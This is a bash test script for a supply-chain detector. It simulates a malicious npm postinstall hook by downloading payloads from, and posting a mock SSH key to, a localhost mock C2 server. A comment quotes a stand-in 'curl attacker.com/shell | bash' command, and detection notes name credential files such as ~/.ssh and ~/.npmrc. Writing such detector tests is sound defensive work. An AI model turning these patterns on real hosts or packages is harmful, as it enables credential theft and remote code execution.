#!/bin/bash
# =============================================================================
# Fenceline Test: Malicious Postinstall Script
# =============================================================================
# Simulates: Postinstall script that spawns child processes and phones home
# Real-world examples: ua-parser-js (2021), Nx compromised (2025)
#
# Attack pattern:
#   1. Package includes postinstall script in package.json
#   2. Script spawns background processes
#   3. Spawned processes download additional payloads or exfiltrate data
#
# Safety: All connections to localhost only. Spawned processes are tracked
#         and killed in cleanup.
# =============================================================================

set -euo pipefail

PORT=9998
CHILD_PIDS=()
SERVER_PID=""

cleanup() {
    echo ""
    echo "[CLEANUP] Stopping all spawned processes..."
    for pid in "${CHILD_PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    if [ -n "$SERVER_PID" ]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    echo "[CLEANUP] Done."
}
trap cleanup EXIT

echo "============================================="
echo "  Fenceline Test: Malicious Postinstall"
echo "============================================="
echo ""

# --- SETUP ---
echo "[SETUP] Starting mock C2 server on localhost:$PORT..."
python3 -m http.server "$PORT" --bind 127.0.0.1 &>/dev/null &
SERVER_PID=$!
sleep 1
echo "[SETUP] Server running (PID $SERVER_PID)"
echo ""

# --- SIMULATION ---
echo "[SIMULATION] Simulating malicious postinstall script..."
echo ""

# Pattern 1: Postinstall spawns a background downloader
echo "[SIM 1/3] Spawning background process (simulates payload downloader)"
(
    sleep 0.5
    curl -s -o /dev/null "http://127.0.0.1:$PORT/payload.sh" 2>/dev/null || true
) &
CHILD_PIDS+=($!)
echo "  -> Background process PID $! spawned (downloading from localhost:$PORT)"
echo ""

# Pattern 2: Postinstall runs hidden shell command
echo "[SIM 2/3] Spawning shell subprocess (simulates reverse shell attempt)"
(
    sleep 0.5
    # Simulates: bash -c "curl attacker.com/shell | bash"
    # Safe version: just touches localhost
    curl -s -o /dev/null "http://127.0.0.1:$PORT/shell.sh" 2>/dev/null || true
) &
CHILD_PIDS+=($!)
echo "  -> Shell subprocess PID $! spawned"
echo ""

# Pattern 3: Postinstall reads sensitive files and exfiltrates
echo "[SIM 3/3] Reading mock sensitive files and sending to C2"
MOCK_SSH_KEY="ssh-rsa SIMULATED_KEY_NOT_REAL testuser@localhost"
curl -s -o /dev/null -X POST "http://127.0.0.1:$PORT/exfil" \
    -H "Content-Type: text/plain" \
    -d "$MOCK_SSH_KEY" 2>/dev/null || true
echo "  -> POST to localhost:$PORT with mock SSH key data"
echo ""

# Wait for background processes
sleep 2

# --- DETECTION POINTS ---
echo "============================================="
echo "  DETECTION POINTS"
echo "============================================="
echo ""
echo "A supply chain detector should flag ALL of the following:"
echo ""
echo "  1. POSTINSTALL SCRIPT SPAWNING CHILD PROCESSES"
echo "     -> npm lifecycle script (preinstall/postinstall) spawning bash/sh"
echo "     -> Any backgrounded process (&) from an install hook"
echo "     -> Process tree: npm -> node -> sh -> curl"
echo ""
echo "  2. CHILD PROCESS MAKING NETWORK CONNECTIONS"
echo "     -> Spawned process contacting non-registry domain"
echo "     -> Background curl/wget/fetch during install"
echo "     -> Any outbound connection from a process tree rooted in npm install"
echo ""
echo "  3. SENSITIVE FILE ACCESS"
echo "     -> Install script reading ~/.ssh/*"
echo "     -> Install script reading ~/.npmrc, ~/.gitconfig"
echo "     -> Install script reading environment variables"
echo ""
echo "  4. PAYLOAD DOWNLOAD PATTERN"
echo "     -> Downloading a .sh file and piping to bash"
echo "     -> Downloading and executing a binary"
echo "     -> Two-stage: first fetch downloads the real payload"
echo ""
echo "[RESULT] Test simulation complete."
